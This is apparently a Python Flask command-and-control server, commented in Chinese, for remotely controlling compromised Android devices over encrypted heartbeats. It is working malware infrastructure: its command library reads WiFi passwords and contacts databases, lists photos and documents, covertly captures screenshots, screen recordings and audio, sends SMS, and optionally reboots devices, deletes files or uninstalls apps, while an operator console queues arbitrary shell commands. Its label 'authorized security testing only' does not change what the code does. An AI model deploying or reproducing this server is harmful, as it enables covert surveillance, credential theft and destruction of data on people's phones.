#!/usr/bin/env python3
"""

依赖：
    pip install flask pycryptodome

启动方式：
    python c2_server.py                              # 安全模式（仅信息收集类指令）
    python c2_server.py --dangerous                   # 启用破坏性指令（reboot/rm等）
    python c2_server.py --dangerous --save-dir ./dl   # 自定义文件保存目录
    python c2_server.py --port 443 --host 0.0.0.0     # 自定义监听地址

选项说明：
    --dangerous      启用重启、关机、删除文件等破坏性指令（默认禁用）
    --save-dir DIR   截屏/录音等文件回传的保存目录（默认 ./c2_downloads）
    --port PORT      监听端口（默认 8443）
    --host ADDR      监听地址（默认 0.0.0.0）
    --max-file-size  最大接收文件大小，单位字节（默认 50MB）
"""

import argparse
import base64
import json
import logging
import os
import queue
import random
import re
import shlex
import subprocess
import sys
import threading
from datetime import datetime
from typing import Optional

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
except ImportError:
    print("[!] 缺少 pycryptodome 库，请安装: pip install pycryptodome")
    sys.exit(1)

try:
    from flask import Flask, request
except ImportError:
    print("[!] 缺少 flask 库，请安装: pip install flask")
    sys.exit(1)

# =====================================================================
#                           指令库定义
# =====================================================================
# 每条指令包含：
#   cmd       - 实际发送的 shell 命令（通过 sh -c 执行）
#   cat       - 类别标签，仅用于日志展示
#   file      - 是否产生文件回传（截屏/录音等），服务器会尝试解码 base64 并保存
#   danger    - 是否为破坏性指令（需 --dangerous 参数启用）
#   desc      - 指令描述，在日志中展示
# =====================================================================

COMMANDS = [
    # ---- 系统信息收集 ----
    {"cmd": "uname -a",                               "cat": "system",  "file": False, "danger": False, "desc": "系统内核版本"},
    {"cmd": "cat /proc/version",                      "cat": "system",  "file": False, "danger": False, "desc": "Linux内核版本"},
    {"cmd": "getprop ro.build.version.sdk",           "cat": "system",  "file": False, "danger": False, "desc": "Android SDK版本"},
    {"cmd": "getprop ro.build.version.release",       "cat": "system",  "file": False, "danger": False, "desc": "Android系统版本"},
    {"cmd": "getprop ro.product.model",               "cat": "system",  "file": False, "danger": False, "desc": "设备型号"},
    {"cmd": "getprop ro.serialno",                    "cat": "system",  "file": False, "danger": False, "desc": "设备序列号"},
    {"cmd": "cat /proc/cpuinfo",                      "cat": "system",  "file": False, "danger": False, "desc": "CPU详细信息"},
    {"cmd": "cat /proc/meminfo",                      "cat": "system",  "file": False, "danger": False, "desc": "内存详细信息"},
    {"cmd": "df -h",                                  "cat": "system",  "file": False, "danger": False, "desc": "磁盘分区及使用率"},
    {"cmd": "dumpsys battery",                        "cat": "system",  "file": False, "danger": False, "desc": "电池状态"},
    {"cmd": "dumpsys diskstats",                      "cat": "system",  "file": False, "danger": False, "desc": "磁盘读写统计"},
    {"cmd": "dumpsys connectivity",                   "cat": "network", "file": False, "danger": False, "desc": "网络连接状态"},
    {"cmd": "ip addr show 2>/dev/null || ifconfig",   "cat": "network", "file": False, "danger": False, "desc": "IP地址和网络接口"},
    {"cmd": "netstat -an 2>/dev/null || ss -an",      "cat": "network", "file": False, "danger": False, "desc": "活跃网络连接"},
    {"cmd": "settings get global airplane_mode_on",   "cat": "system",  "file": False, "danger": False, "desc": "飞行模式状态"},
    {"cmd": "settings get system screen_brightness",  "cat": "system",  "file": False, "danger": False, "desc": "屏幕亮度"},
    {"cmd": "wm size",                                "cat": "system",  "file": False, "danger": False, "desc": "屏幕分辨率"},
    {"cmd": "uptime",                                 "cat": "system",  "file": False, "danger": False, "desc": "系统运行时间"},

    # ---- 应用与进程信息 ----
    {"cmd": "pm list packages 2>/dev/null | head -80",   "cat": "apps", "file": False, "danger": False, "desc": "已安装应用(前80)"},
    {"cmd": "pm list packages -3 2>/dev/null | head -50","cat": "apps", "file": False, "danger": False, "desc": "第三方应用"},
    {"cmd": "ps -A 2>/dev/null || ps 2>/dev/null",       "cat": "apps", "file": False, "danger": False, "desc": "当前运行进程"},
    {"cmd": "top -b -n 1 -d 1 2>/dev/null | head -30 || echo 'top unavailable'", "cat": "apps", "file": False, "danger": False, "desc": "进程CPU排名"},
    {"cmd": "dumpsys package com.android.chrome 2>/dev/null | head -20 || echo 'NOT_FOUND'", "cat": "apps", "file": False, "danger": False, "desc": "Chrome包详情"},
    {"cmd": "pm path com.android.chrome 2>/dev/null || echo 'NOT_FOUND'", "cat": "apps", "file": False, "danger": False, "desc": "Chrome APK路径"},

    # ---- 文件系统操作 ----
    {"cmd": "ls -la /sdcard/ 2>/dev/null | head -30",                              "cat": "files", "file": False, "danger": False, "desc": "SDCard根目录"},
    {"cmd": "ls -la /sdcard/DCIM/Camera/ 2>/dev/null | head -30 || echo 'NODIR'",  "cat": "files", "file": False, "danger": False, "desc": "DCIM照片目录"},
    {"cmd": "ls -la /sdcard/Download/ 2>/dev/null | head -30 || echo 'NODIR'",     "cat": "files", "file": False, "danger": False, "desc": "下载目录"},
    {"cmd": "ls -la /sdcard/Documents/ 2>/dev/null | head -30 || echo 'NODIR'",    "cat": "files", "file": False, "danger": False, "desc": "文档目录"},
    {"cmd": "ls -la /data/data/com.android.providers.contacts/databases/ 2>/dev/null || echo 'NO_ACCESS'", "cat": "files", "file": False, "danger": False, "desc": "联系人数据库(需root)"},
    {"cmd": "cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null | head -30 || echo 'NO_ACCESS'",         "cat": "files", "file": False, "danger": False, "desc": "WiFi密码(需root)"},
    {"cmd": "find /sdcard -name '*.pdf' -o -name '*.doc*' 2>/dev/null | head -30 || echo 'NONE'",         "cat": "files", "file": False, "danger": False, "desc": "文档文件搜索"},
    {"cmd": "find /sdcard -name '*.db' 2>/dev/null | head -20 || echo 'NONE'",                            "cat": "files", "file": False, "danger": False, "desc": "数据库文件搜索"},

    # ---- 截屏（文件回传）----
    {
        "cmd": "screencap -p /sdcard/.c2temp.png 2>/dev/null; "
               "if [ -f /sdcard/.c2temp.png ]; then "
               "  echo 'FILE_SIZE:' && wc -c < /sdcard/.c2temp.png && "
               "  echo '---B64_DATA---' && "
               "  base64 -w0 /sdcard/.c2temp.png 2>/dev/null && "
               "  rm -f /sdcard/.c2temp.png; "
               "else echo 'SCREENSHOT_FAILED'; fi",
        "cat": "spy", "file": True, "danger": False,
        "desc": "截屏并base64回传"
    },

    # ---- 录屏（仅返回文件大小，视频太大不适宜base64）----
    {
        "cmd": "screenrecord --time-limit 3 /sdcard/.c2temp.mp4 2>/dev/null; "
               "if [ -f /sdcard/.c2temp.mp4 ]; then "
               "  ls -la /sdcard/.c2temp.mp4 && "
               "  echo '---B64_DATA---' && "
               "  base64 -w0 /sdcard/.c2temp.mp4 2>/dev/null && "
               "  rm -f /sdcard/.c2temp.mp4; "
               "else echo 'RECORD_FAILED'; fi",
        "cat": "spy", "file": True, "danger": False,
        "desc": "录屏3秒并回传(文件可能较大)"
    },

    # ---- 录音（测试，使用Android内置工具）----
    {
        "cmd": "tinycap /sdcard/.c2temp.wav -d 0 -c 1 -r 44100 -b 16 -t 3 2>/dev/null; "
               "if [ -f /sdcard/.c2temp.wav ]; then "
               "  ls -la /sdcard/.c2temp.wav && rm -f /sdcard/.c2temp.wav; "
               "else echo 'AUDIO_RECORD_FAILED'; fi",
        "cat": "spy", "file": False, "danger": False,
        "desc": "录音测试(需tinycap)"
    },

    # ---- 短信/电话（测试，需root）----
    {"cmd": "service call isms 6 s16 \"+8613800138000\" i32 0 i32 0 s16 \"TestMsg\" 2>/dev/null || echo 'SMS_FAILED'",
     "cat": "spy", "file": False, "danger": False, "desc": "发送测试短信(需root)"},

    # ---- 安装/卸载 ----
    {"cmd": "pm list packages | grep -i 'com.example' 2>/dev/null || echo 'NO_MATCH'",
     "cat": "apps", "file": False, "danger": False, "desc": "查找com.example包"},
    {"cmd": "pm path com.android.calculator2 2>/dev/null || echo 'NOT_FOUND'",
     "cat": "apps", "file": False, "danger": False, "desc": "计算器APK路径"},

    # ---- 危险/破坏性指令（需 --dangerous 启用）----
    {"cmd": "reboot",        "cat": "danger", "file": False, "danger": True, "desc": "重启设备"},
    {"cmd": "reboot -p",     "cat": "danger", "file": False, "danger": True, "desc": "关机"},
    {"cmd": "rm -rf /sdcard/c2_danger_test/", "cat": "danger", "file": False, "danger": True, "desc": "删除c2_danger_test目录"},
    {"cmd": "pm uninstall --user 0 com.android.chrome 2>/dev/null || echo 'UNINSTALL_FAILED'",
     "cat": "danger", "file": False, "danger": True, "desc": "卸载Chrome"},
]


# =====================================================================
#                           全局状态
# =====================================================================
command_counter = 0           # 已下发指令计数
last_cmd_def = None           # 上一条下发指令的定义（用于结果解析）
command_queue = queue.Queue() # 操作员手动下发的指令队列（控制台输入）
queue_lock = threading.Lock() # 队列访问锁（非必要，但保留备用）
random_disabled = False       # 是否完全禁止随机下发，仅从队列取指令

# =====================================================================
#                           AES 加解密（原机制不变）
# =====================================================================
def decrypt_aes(ciphertext_b64: str, key: bytes) -> Optional[str]:
    try:
        cipher = AES.new(key, AES.MODE_ECB)
        ciphertext = base64.b64decode(ciphertext_b64)
        plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
        return plaintext.decode("utf-8")
    except Exception as e:
        logging.getLogger("C2Server").error(f"AES解密失败: {e}")
        return None


def encrypt_aes(plaintext: str, key: bytes) -> Optional[str]:
    try:
        cipher = AES.new(key, AES.MODE_ECB)
        data = plaintext.encode("utf-8")
        padded = pad(data, AES.block_size)
        ciphertext = cipher.encrypt(padded)
        return base64.b64encode(ciphertext).decode("utf-8")
    except Exception as e:
        logging.getLogger("C2Server").error(f"AES加密失败: {e}")
        return None


# =====================================================================
#                           文件提取辅助
# =====================================================================
def extract_file_from_result(result_text: str) -> tuple:
    """
    从命令执行结果中提取 base64 文件数据

    返回: (file_data_bytes | None, file_size_str | None)
    """
    # 策略1: 查找 FILE_SIZE: + ---B64_DATA--- 标记格式
    size_match = re.search(r"FILE_SIZE:\s*(\d+)", result_text)
    b64_match = re.search(r"---B64_DATA---\s*([A-Za-z0-9+/=]+)", result_text, re.DOTALL)

    if b64_match:
        raw = b64_match.group(1).strip()
        try:
            data = base64.b64decode(raw)
            size = size_match.group(1) if size_match else str(len(data))
            return data, size
        except Exception:
            pass

    # 策略2: 若结果仅包含合法 base64 字符，直接整体解码
    cleaned = result_text.strip()
    if re.fullmatch(r"[A-Za-z0-9+/=]+", cleaned):
        try:
            data = base64.b64decode(cleaned)
            return data, str(len(data))
        except Exception:
            pass

    return None, None


def save_file(data: bytes, save_dir: str, prefix: str = "file") -> str:
    """将文件数据保存到磁盘，返回文件路径"""
    os.makedirs(save_dir, exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    ext_map = {b"\x89PNG": ".png", b"\x00\x00\x00\x18ftyp": ".mp4", b"RIFF": ".wav"}
    ext = ".bin"
    for magic, e in ext_map.items():
        if data[:len(magic)] == magic:
            ext = e
            break
    filename = f"{prefix}_{timestamp}{ext}"
    filepath = os.path.join(save_dir, filename)
    with open(filepath, "wb") as f:
        f.write(data)
    return filepath


# =====================================================================
#                           日志增强
# =====================================================================
def format_bytes(n: int) -> str:
    for unit in ("B", "KB", "MB", "GB"):
        if n < 1024:
            return f"{n:.2f} {unit}"
        n /= 1024
    return f"{n:.2f} TB"


def log_heartbeat(payload: dict):
    """格式化打印心跳信息"""
    model = payload.get("device_model", "N/A")
    manufacturer = payload.get("manufacturer", "N/A")
    ver = payload.get("android_version", "N/A")
    sdk = payload.get("sdk_int", "N/A")
    rooted = payload.get("is_rooted", "N/A")
    net = payload.get("network_type", "N/A")
    ts = payload.get("timestamp", "")

    logger.info("=" * 56)
    logger.info(f"[*] 心跳 @ {datetime.now().strftime('%H:%M:%S')}")
    logger.info(f"    设备  : {manufacturer} {model}")
    logger.info(f"    系统  : Android {ver} (SDK {sdk})")
    logger.info(f"    Root  : {rooted}")
    logger.info(f"    网络  : {net}")
    if ts:
        logger.info(f"    时间戳: {ts}")
    logger.info("=" * 56)


def log_send_command(cmd_def: dict, idx: int, source: str = "随机"):
    """格式化打印下发指令"""
    danger_tag = " [危险]" if cmd_def["danger"] else ""
    file_tag = " [文件回传]" if cmd_def["file"] else ""
    logger.info(f"[>] 下发 [#{idx}]{danger_tag}{file_tag} 来源:{source}")
    logger.info(f"    类别: {cmd_def['cat']}  |  {cmd_def['desc']}")
    logger.info(f"    命令: {cmd_def['cmd'][:120]}{'…' if len(cmd_def['cmd']) > 120 else ''}")


def log_receive_result(result_text: str, cmd_def: dict, idx: int):
    """格式化打印回传结果"""
    size = len(result_text)
    truncated = "[截断]" if "[输出过大，已截断]" in result_text else ""
    summary = result_text[:500].strip()
    # 去掉可能的 base64 长数据，避免日志爆炸
    if cmd_def and cmd_def.get("file"):
        # 只打印非 base64 部分
        parts = re.split(r"---B64_DATA---", summary)
        summary = parts[0].strip() if parts else f"<base64 数据 {format_bytes(size)}>"

    logger.info(f"[<] 回传 [#{idx}] 大小={format_bytes(size)}{truncated}")
    for line in summary.split("\n")[:15]:
        logger.info(f"    | {line}" if line else "")
    if len(summary.split("\n")) > 15:
        logger.info(f"    | … (共 {len(summary.split(chr(10)))} 行)")


# =====================================================================
#                           Flask 路由
# =====================================================================
app = Flask(__name__)
logger = logging.getLogger("C2Server")
cli_args = None               # 解析后的命令行参数


@app.route("/heartbeat", methods=["POST"])
def handle_heartbeat():
    """
    处理心跳请求和指令结果回传

    - 若解密JSON含 "result" 字段 → 视为指令执行结果
    - 否则 → 视为心跳，随机下发一条加密指令
    """
    global command_counter, last_cmd_def

    encrypted_data = request.data.decode("utf-8")
    if not encrypted_data:
        logger.warning("收到空数据")
        return "error", 400

    decrypted = decrypt_aes(encrypted_data, cli_args.key.encode())
    if decrypted is None:
        return "decrypt error", 400

    try:
        payload = json.loads(decrypted)
    except json.JSONDecodeError:
        logger.warning(f"JSON解析失败: {decrypted[:200]}")
        return "json error", 400

    # ============ 区分心跳 vs 结果回传 ============
    if "result" in payload:
        # ---- 这是指令执行结果 ----
        result_text = payload["result"]
        log_receive_result(result_text, last_cmd_def, command_counter)

        # 若上条指令是文件回传类型，尝试提取并保存文件
        if last_cmd_def and last_cmd_def.get("file"):
            file_data, file_size = extract_file_from_result(result_text)
            if file_data:
                save_path = save_file(
                    file_data, cli_args.save_dir, last_cmd_def["cat"])
                logger.info(f"[*] 文件已保存: {save_path} ({format_bytes(len(file_data))})")
            else:
                logger.warning("[!] 文件回传指令但未提取到有效base64数据")

        return "ok", 200

    else:
        # ---- 这是标准心跳 ----
        log_heartbeat(payload)
        command_counter += 1

        # 优先从操作员控制台队列中取指令
        cmd_def = None
        try:
            cmd_def = command_queue.get_nowait()
            source = "控制台"
        except queue.Empty:
            source = "随机" if not random_disabled else "空队列(已禁用随机)"

        if cmd_def is None:
            if random_disabled:
                # 随机已禁用且队列为空 → 下发空操作占位
                cmd_def = {"cmd": "echo 'NO_OP'", "cat": "none",
                           "file": False, "danger": False,
                           "desc": "队列空占位(随机已禁用)"}
                source = "空队列"
            else:
                # 队列为空，从指令库随机选
                eligible = [c for c in COMMANDS if not c["danger"] or cli_args.dangerous]
                if not eligible:
                    logger.warning("[!] 无可下发的指令（所有指令均为危险指令且未启用 --dangerous）")
                    eligible = [{"cmd": "echo 'NO_CMD_AVAILABLE'", "cat": "none",
                                 "file": False, "danger": False, "desc": "无可用指令"}]
                cmd_def = random.choice(eligible)

        last_cmd_def = cmd_def
        log_send_command(cmd_def, command_counter, source)

        encrypted_cmd = encrypt_aes(cmd_def["cmd"], cli_args.key.encode())
        if encrypted_cmd is None:
            return "encrypt error", 500

        return encrypted_cmd, 200, {"Content-Type": "text/plain"}


@app.route("/", methods=["GET"])
def index():
    return "C2 Test Server Running", 200


# =====================================================================
#                            证书生成
# =====================================================================
def ensure_certificate(cert_file: str, key_file: str):
    if os.path.exists(cert_file) and os.path.exists(key_file):
        logger.info("[*] 使用现有证书文件: %s, %s", cert_file, key_file)
        return

    logger.info("[*] 正在生成自签名证书（openssl）...")
    try:
        subprocess.run(
            [
                "openssl", "req", "-x509", "-newkey", "rsa:2048",
                "-keyout", key_file, "-out", cert_file,
                "-days", "365", "-nodes",
                "-subj", "/C=CN/ST=Test/L=Test/O=Test/OU=Test/CN=192.168.1.100",
                "-addext", "subjectAltName=IP:192.168.1.100"
            ],
            check=True, capture_output=True, text=True
        )
        logger.info("[*] 自签名证书已生成")
    except FileNotFoundError:
        logger.error(
            "[!] 未找到 openssl 命令。请手动生成证书:\n"
            f"    openssl req -x509 -newkey rsa:2048 -keyout {key_file} "
            f"-out {cert_file} -days 365 -nodes "
            '-subj "/C=CN/ST=Test/L=Test/O=Test/OU=Test/CN=192.168.1.100"'
        )
        sys.exit(1)
    except subprocess.CalledProcessError as e:
        logger.error(f"[!] 证书生成失败: {e.stderr}")
        sys.exit(1)


# =====================================================================
#                    交互式控制台（独立线程）
# =====================================================================
def interactive_console():
    """
    操作员控制台线程，从 stdin 接收命令并推入队列。

    支持命令：
      send <shell命令>         — 将一条 shell 指令推入下发队列
      queue                    — 查看当前队列中的待下发指令
      clear                    — 清空队列
      list [cat]               — 列出指令库（可指定类别筛选）
      dangerous [on|off]       — 查看/切换危险指令开关
      stats                    — 统计信息
      help                     — 帮助
      exit                     — 退出服务器
    """
    while True:
        try:
            raw = sys.stdin.readline()
            if not raw:
                break
            raw = raw.strip()
            if not raw:
                continue

            parts = shlex.split(raw)
            cmd = parts[0].lower()

            if cmd == "send":
                if len(parts) < 2:
                    logger.info("[控制台] 用法: send <shell命令>")
                    continue
                shell_cmd = " ".join(parts[1:])
                cmd_def = {
                    "cmd": shell_cmd,
                    "cat": "manual",
                    "file": False,
                    "danger": False,
                    "desc": "操作员手动下发"
                }
                command_queue.put(cmd_def)
                qsize = command_queue.qsize()
                logger.info(f"[控制台] 已入队 [#{qsize}]: {shell_cmd[:80]}")

            elif cmd == "queue":
                items = list(command_queue.queue)
                if not items:
                    logger.info("[控制台] 队列为空")
                else:
                    logger.info(f"[控制台] 队列中待下发指令 ({len(items)} 条):")
                    for i, item in enumerate(items, 1):
                        logger.info(f"  [{i}] {item['desc']}: {item['cmd'][:80]}")

            elif cmd == "clear":
                with queue_lock:
                    while not command_queue.empty():
                        try:
                            command_queue.get_nowait()
                        except queue.Empty:
                            break
                logger.info("[控制台] 队列已清空")

            elif cmd == "list":
                filter_cat = parts[1].lower() if len(parts) > 1 else None
                for i, c in enumerate(COMMANDS, 1):
                    if filter_cat and c["cat"] != filter_cat:
                        continue
                    danger = " [危险]" if c["danger"] else ""
                    logger.info(f"  [{i:2d}]{danger} [{c['cat']:8s}] {c['desc']}")
                    logger.info(f"        {c['cmd'][:90]}")

            elif cmd == "dangerous":
                if len(parts) > 1:
                    if parts[1].lower() in ("on", "1", "true", "yes"):
                        cli_args.dangerous = True
                        logger.info("[控制台] 危险指令已启用")
                    elif parts[1].lower() in ("off", "0", "false", "no"):
                        cli_args.dangerous = False
                        logger.info("[控制台] 危险指令已禁用")
                else:
                    logger.info(f"[控制台] 危险指令: {'已启用' if cli_args.dangerous else '已禁用'}")

            elif cmd == "stats":
                total = command_counter
                qsize = command_queue.qsize()
                file_cmds = sum(1 for c in COMMANDS if c["file"])
                logger.info(f"[控制台] 已下发指令: {total}  |  队列待发: {qsize}")
                logger.info(f"[控制台] 指令库总数: {len(COMMANDS)} (文件回传: {file_cmds})")

            elif cmd == "random":
                if len(parts) > 1:
                    global random_disabled
                    if parts[1].lower() in ("off", "0", "false", "no", "disable"):
                        random_disabled = True
                        logger.info("[控制台] 随机下发已禁用 → 仅从队列取指令")
                    else:
                        random_disabled = False
                        logger.info("[控制台] 随机下发已启用 → 队列空时回退随机")
                else:
                    logger.info(f"[控制台] 随机下发: {'已禁用' if random_disabled else '已启用'}")

            elif cmd == "exit":
                logger.info("[控制台] 收到 exit，关闭服务器...")
                os._exit(0)

            elif cmd == "help":
                logger.info("""[控制台] 可用命令:
  send <shell命令>      手动推送指令到下发队列
  queue                 查看队列中的待下发指令
  clear                 清空队列
  list [cat]            列出指令库（可筛选类别: system/network/apps/files/spy/danger）
  dangerous [on|off]    查看/切换危险指令开关
  random [on|off]       查看/切换随机下发（off=禁用随机，仅从队列取指令）
  stats                 统计信息
  help                  本帮助
  exit                  退出服务器""")

            else:
                logger.warning(f"[控制台] 未知命令: {cmd}  输入 help 查看帮助")

        except EOFError:
            break
        except Exception as e:
            logger.error(f"[控制台] 异常: {e}")


# =====================================================================
#                            启动入口
# =====================================================================
def parse_args():
    parser = argparse.ArgumentParser(
        description="增强型 C2 测试服务器 - 仅用于授权安全测试",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  python c2_server.py                        安全模式
  python c2_server.py --dangerous             含破坏性指令
  python c2_server.py --dangerous --save-dir ./dl
  python c2_server.py --port 443
        """)
    parser.add_argument("--port", type=int, default=8443, help="监听端口（默认 8443）")
    parser.add_argument("--host", type=str, default="0.0.0.0", help="监听地址（默认 0.0.0.0）")
    parser.add_argument("--dangerous", action="store_true", default=False,
                        help="启用危险指令（reboot / rm / pm uninstall 等）")
    parser.add_argument("--save-dir", type=str, default="./c2_downloads",
                        help="文件回传保存目录（默认 ./c2_downloads）")
    parser.add_argument("--key", type=str, default="TestC2Key16Byte!",
                        help="AES密钥（16字节，默认 TestC2Key16Byte!）")
    parser.add_argument("--log-dir", type=str, default="./logs",
                        help="Flask HTTP 日志目录（默认 ./logs），设为 'console' 则输出到终端")
    return parser.parse_args()


def main():
    global cli_args
    cli_args = parse_args()

    # 将 Flask（werkzeug）的 HTTP 请求日志重定向到文件
    if cli_args.log_dir.lower() != "console":
        os.makedirs(cli_args.log_dir, exist_ok=True)
        log_path = os.path.join(cli_args.log_dir,
                                f"flask_{datetime.now().strftime('%Y%m%d')}.log")
        fh = logging.FileHandler(log_path, encoding="utf-8")
        fh.setLevel(logging.INFO)
        fh.setFormatter(logging.Formatter("[%(asctime)s] %(levelname)s: %(message)s",
                                          datefmt="%Y-%m-%d %H:%M:%S"))
        werkzeug_logger = logging.getLogger("werkzeug")
        werkzeug_logger.handlers.clear()
        werkzeug_logger.addHandler(fh)
        werkzeug_logger.propagate = False
        logger.info(f"[*] Flask HTTP 日志已重定向至: {log_path}")
    else:
        logger.info("[*] Flask HTTP 日志输出到终端")

    # 校验 AES 密钥长度
    if len(cli_args.key.encode("utf-8")) != 16:
        logger.error("[!] AES 密钥必须为16字节")
        sys.exit(1)

    # 确保文件保存目录存在
    os.makedirs(cli_args.save_dir, exist_ok=True)

    # 打印启动摘要
    danger_status = "已启用" if cli_args.dangerous else "已禁用（加 --dangerous 启用）"
    total_cmds = len(COMMANDS)
    safe_cmds = sum(1 for c in COMMANDS if not c["danger"])
    danger_cmds = total_cmds - safe_cmds
    file_cmds = sum(1 for c in COMMANDS if c["file"])

    logger.info("=" * 56)
    logger.info("  C2 测试服务器  v2.0  (增强指令版)")
    logger.info("=" * 56)
    logger.info(f"  监听地址 : https://{cli_args.host}:{cli_args.port}/heartbeat")
    logger.info(f"  AES密钥  : {cli_args.key}")
    logger.info(f"  危险指令 : {danger_status}")
    logger.info(f"  指令总数 : {total_cmds} (安全{safe_cmds} + 危险{danger_cmds})")
    logger.info(f"  文件回传 : {file_cmds} 类指令")
    logger.info(f"  保存目录 : {os.path.abspath(cli_args.save_dir)}")
    logger.info("=" * 56)
    logger.info("  [*] 等待客户端连接...")
    logger.info("  [*] 控制台已启动，输入 help 查看操作命令")

    # 启动操作员控制台（独立线程）
    console_thread = threading.Thread(target=interactive_console, daemon=True)
    console_thread.start()

    # 生成证书
    script_dir = os.path.dirname(os.path.abspath(__file__))
    os.chdir(script_dir)
    ensure_certificate("server.crt", "server.key")

    # 启动 HTTPS 服务器
    app.run(
        host=cli_args.host,
        port=cli_args.port,
        ssl_context=("server.crt", "server.key"),
        debug=False,
        threaded=True
    )


if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format="[%(asctime)s] %(levelname)s: %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )
    main()
